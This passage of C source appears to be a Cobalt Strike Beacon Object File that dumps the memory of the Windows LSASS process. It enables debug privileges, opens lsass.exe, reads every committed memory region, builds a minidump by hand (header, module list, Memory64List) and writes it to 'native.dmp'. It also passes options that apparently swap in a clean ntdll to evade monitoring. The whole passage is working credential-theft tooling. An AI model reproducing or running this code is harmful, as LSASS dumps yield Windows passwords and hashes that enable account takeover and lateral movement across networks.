            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
                BeaconPrintf(CALLBACK_OUTPUT, "NtReadVirtualMemory failed with status: 0x%p\n", ntstatus);
            }
            // Add to MemFile array
            MemFile memFile;
            char* buffer_name[17];
            MyIntToHexStr((long long) mem_address, buffer_name);
            MyStrcpy(memFile.filename, buffer_name, 17);
            memFile.content = (unsigned char*) buffer;
            memFile.size = mbi.RegionSize;
            memFile.address = mem_address;
            memfile_list[memfile_count++] = memFile;
        }
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }    
    // Close handle
    NTDLL$NtClose(hProcess);
    // Return values
    *memfile_countOutput = memfile_count;
    return memfile_list;
}

    
ModuleInformation* GetModuleInfo(HANDLE* hProcessOutput, int* module_counterOutput){
    // Process handle
    EnableDebugPrivileges();
    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
    *hProcessOutput = hProcess;
    
    // Modules information
    int module_counter = 0;
    ModuleInformation* module_list = CustomGetModuleHandle(hProcess, &module_counter);    
    *module_counterOutput = module_counter;
    
    // Aux variables
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";

    while ((long long)mem_address < proc_max_address_l) {
        // Populate MEMORY_BASIC_INFORMATION struct
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;
        NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);

        // If readable and committed --> Get information
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            // Find the module by name
            ModuleInformation aux_module = find_module_by_name(module_list, module_counter, aux_name);

            if (mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.dll_base) {
                aux_module.size = aux_size;
                // Find module index
                int aux_index = find_index_by_name(module_list, module_counter, aux_name);
                // BeaconPrintf(CALLBACK_OUTPUT, "[+] aux_index: \t\t%d\n", aux_index);
                if (aux_index >= 0 && aux_index < module_counter){
                    module_list[aux_index] = aux_module;
                }
                for (int k = 0; k < module_counter; k++) {
                    if (mbi.BaseAddress == module_list[k].dll_base) {                        
                        MyStrcpy(aux_name, module_list[k].base_dll_name, MAX_PATH);
                        aux_size = (int)mbi.RegionSize;
                    }
                }
            }
            else {
                aux_size += (int)mbi.RegionSize;
            }
        }
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }
    return module_list;
}


OSVERSIONINFOW GetOSInfo(){
    OSVERSIONINFOW osvi;
    NTSTATUS status = NTDLL$RtlGetVersion(&osvi);
    if (status == 0) {
        return osvi;
    }
    return;
}


void MyMemCpy(void *dest, const void *src, size_t len) {
    char *d = (char*)dest;
    const char *s = (const char*)src;
    while (len--) {
        *d++ = *s++;
    }
}


char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, int moduleinfo_len, MemFile* mem64list_arr, int mem64list_len, int* output_len){
    // Heap address
    HANDLE hHeap = KERNEL32$GetProcessHeap();

    // Calculate values
    int number_modules = moduleinfo_len;
    int modulelist_size = 4 + 108 * number_modules;

    // Adjust for Unicode strings
    for (int i = 0; i < moduleinfo_len; i++) {
        int module_fullpath_len = MyStrLen(moduleinfo_arr[i].full_dll_path);
        modulelist_size += (module_fullpath_len * 2 + 8);
    }

    int mem64list_offset = modulelist_size + 0x7c;
    int mem64list_size = (16 + 16 * mem64list_len);
    int offset_memory_regions = mem64list_offset + mem64list_size;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Total number of modules: \t%d\n", number_modules);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ModuleListStream size:   \t%d\n", modulelist_size);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Mem64List offset: \t\t%d\n", mem64list_offset);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Mem64List size: \t\t%d\n", mem64list_size);

    // Header
    char header[32] = { 0x4d, 0x44, 0x4d, 0x50, 0x93, 0xa7, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00 };

    // Stream Directory
    char modulelist_sizeByteSlice[4], mem64list_sizeByteSlice[4], mem64list_offsetByteSlice[4];
    *(int*)modulelist_sizeByteSlice = modulelist_size;
    *(int*)mem64list_sizeByteSlice = mem64list_size;
    *(int*)mem64list_offsetByteSlice = mem64list_offset;
    char stream_directory[36];
    char data1[] = { 0x04, 0x00, 0x00, 0x00 };
    char data2[] = { 0x7c, 0x00, 0x00, 0x00 };
    char data3[] = { 0x07, 0x00, 0x00, 0x00 };
    char data4[] = { 0x38, 0x00, 0x00, 0x00 };
    char data5[] = { 0x44, 0x00, 0x00, 0x00 };
    char data6[] = { 0x09, 0x00, 0x00, 0x00 };
    MyMemCpy(stream_directory, data1, 4);
    MyMemCpy(stream_directory + 4, modulelist_sizeByteSlice, 4);
    MyMemCpy(stream_directory + 8, data2, 4);
    MyMemCpy(stream_directory + 12, data3, 4);
    MyMemCpy(stream_directory + 16, data4, 4);
    MyMemCpy(stream_directory + 20, data5, 4);
    MyMemCpy(stream_directory + 24, data6, 4);
    MyMemCpy(stream_directory + 28, mem64list_sizeByteSlice, 4);
    MyMemCpy(stream_directory + 32, mem64list_offsetByteSlice, 4);

    // SystemInfoStream
    char systeminfostream[56] = { 0 };
    int processor_architecture = 9;
    int majorVersion = osvi.dwMajorVersion;
    int minorVersion = osvi.dwMinorVersion;
    int buildNumber =  osvi.dwBuildNumber;
    MyMemCpy(systeminfostream, &processor_architecture, 4);
    MyMemCpy(systeminfostream + 8, &majorVersion, 4);
    MyMemCpy(systeminfostream + 12, &minorVersion, 4);
    MyMemCpy(systeminfostream + 16, &buildNumber, 4);

    // ModuleListStream
    int pointer_index = 0x7c + 4 + (108 * number_modules);
    char* modulelist_stream = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, modulelist_size);
    int modulelist_stream_offset = 0;

    *(int*)(modulelist_stream + modulelist_stream_offset) = number_modules;
    modulelist_stream_offset += 4;

    for (int i = 0; i < moduleinfo_len; i++) {
        long long baseAddress = (long long) moduleinfo_arr[i].dll_base;
        long long size = (long long)moduleinfo_arr[i].size; 
        MyMemCpy(modulelist_stream + modulelist_stream_offset, &baseAddress, 8); // Base Address
        modulelist_stream_offset += 8;
        MyMemCpy(modulelist_stream + modulelist_stream_offset, &size, 8); // Size
        modulelist_stream_offset += 12;
        *(long long*)(modulelist_stream + modulelist_stream_offset) = pointer_index; // Offset
        modulelist_stream_offset += 8;
        pointer_index += (MyStrLen(moduleinfo_arr[i].full_dll_path) * 2 + 8); // Adjust pointer
        MyMemSet(modulelist_stream + modulelist_stream_offset, 0, 80); // 80 zeros
        modulelist_stream_offset += 80;
    }

    // Copy unicode strings
    for (int i = 0; i < moduleinfo_len; i++) {
        char* full_path = moduleinfo_arr[i].full_dll_path;
        int full_path_length = MyStrLen(full_path);
        int full_path_unicode_size = full_path_length * 2;
        char* unicode_bytearr = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, full_path_length * 2);
        for (int j = 0; j < full_path_length; j++) {
            short utf16_val = (short)full_path[j];  // Simple conversion, replace with actual UTF-16 encoding if needed.
            MyMemCpy(unicode_bytearr + j * 2, &utf16_val, 2);
        }
        MyMemCpy(modulelist_stream + modulelist_stream_offset, &full_path_unicode_size, 4);
        modulelist_stream_offset += 4;
        MyMemCpy(modulelist_stream + modulelist_stream_offset, unicode_bytearr, full_path_length * 2);
        modulelist_stream_offset += full_path_length * 2;
        MyMemSet(modulelist_stream + modulelist_stream_offset, 0, 4);
        modulelist_stream_offset += 4;
        KERNEL32$HeapFree(hHeap, 0, unicode_bytearr);
    }

    // Memory64List
    char* memory64list_stream = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, mem64list_size);
    int memory64list_stream_offset = 0;
    *(long long*)(memory64list_stream + memory64list_stream_offset) = mem64list_len;
    memory64list_stream_offset += 8;
    *(long long*)(memory64list_stream + memory64list_stream_offset) = offset_memory_regions;
    memory64list_stream_offset += 8;
    for (int i = 0; i < mem64list_len; i++) {
        long long address = (long long)mem64list_arr[i].address;
        long long size = mem64list_arr[i].size;
        MyMemCpy(memory64list_stream + memory64list_stream_offset, &address, 8);
        memory64list_stream_offset += 8;
        MyMemCpy(memory64list_stream + memory64list_stream_offset, &size, 8);
        memory64list_stream_offset += 8;
    }

    // Memory regions
    size_t memoryRegions_len = 0;
    char* concatenated_content = NULL;
    for (int i = 0; i < mem64list_len; i++) {
        char* content = mem64list_arr[i].content;
        size_t size = mem64list_arr[i].size;
        // Allocate a new block large enough to hold the current content plus new content
        char* new_block = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, memoryRegions_len + size);
        if (new_block == NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "Memory allocation failed!\n");
            KERNEL32$HeapFree(hHeap, 0, concatenated_content);
            concatenated_content = NULL;
        }
        if (concatenated_content != NULL) {
            MyMemCpy(new_block, concatenated_content, memoryRegions_len);
            KERNEL32$HeapFree(hHeap, 0, concatenated_content);
        }
        MyMemCpy(new_block + memoryRegions_len, content, size);
        concatenated_content = new_block;
        memoryRegions_len += size;
    }

    // Concatenate each part byte array
    int dump_file_size = 32+ 36+ 56 + modulelist_size + mem64list_size + memoryRegions_len;
    *output_len = dump_file_size;
    
    char* dump_file_bytes = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dump_file_size);
    int dump_file_offset = 0;
    MyMemCpy(dump_file_bytes + dump_file_offset, header, 32); // Header
    dump_file_offset += 32;
    MyMemCpy(dump_file_bytes + dump_file_offset, stream_directory, 36); // Stream directory
    dump_file_offset += 36;    
    MyMemCpy(dump_file_bytes + dump_file_offset, systeminfostream, 56); // SystemInfoStream
    dump_file_offset += 56;    
    MyMemCpy(dump_file_bytes + dump_file_offset, modulelist_stream, modulelist_size); // ModuleListStream
    dump_file_offset += modulelist_size;    
    MyMemCpy(dump_file_bytes + dump_file_offset, memory64list_stream, mem64list_size); // Memory64List
    dump_file_offset += mem64list_size; 
    MyMemCpy(dump_file_bytes + dump_file_offset, concatenated_content, memoryRegions_len); // Memory regions
    
    // Free memory
    KERNEL32$HeapFree(hHeap, 0, modulelist_stream);
    KERNEL32$HeapFree(hHeap, 0, memory64list_stream);
    KERNEL32$HeapFree(hHeap, 0, concatenated_content);

    return dump_file_bytes;
}


void go(IN PCHAR Buffer, IN ULONG Length) {
    // Get first argument value
    //      - disk:        0e0000000a0000006400690073006b000000
    //      - knowndlls:   18000000140000006b006e006f0077006e0064006c006c0073000000
    //      - debugproc:   180000001400000064006500620075006700700072006f0063000000
    datap parser;
    wchar_t *option_w = NULL;
    BeaconDataParse(&parser, Buffer, Length);
    option_w = (wchar_t *)BeaconDataExtract(&parser, NULL);
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char* option = "";
    if(option_w != NULL){
        option = ConvertUnicodeToAnsi(hHeap, option_w);
    }
    ReplaceLibrary(option);

    // File names
    char* dump_fname = "native.dmp";    

    // OS Information (Lock)
    OSVERSIONINFOW osvi = GetOSInfo();

    // Get Modules Information (Shock)    
    HANDLE hProcess;
    int moduleInformationList_len = 0;
    ModuleInformation* moduleInformationList = GetModuleInfo(&hProcess, &moduleInformationList_len);

    // Dump memory regions (Barrel)
    int memfile_count = NULL;
    MemFile* memfile_list = ReadMemReg(hProcess, &memfile_count);

    // Create Minidump
    int dump_len = NULL;
    char* dump_file_bytes = get_dump_bytearr(osvi, moduleInformationList, moduleInformationList_len, memfile_list, memfile_count, &dump_len);
    write_string_to_file(dump_fname, dump_file_bytes, dump_len, TRUE);
}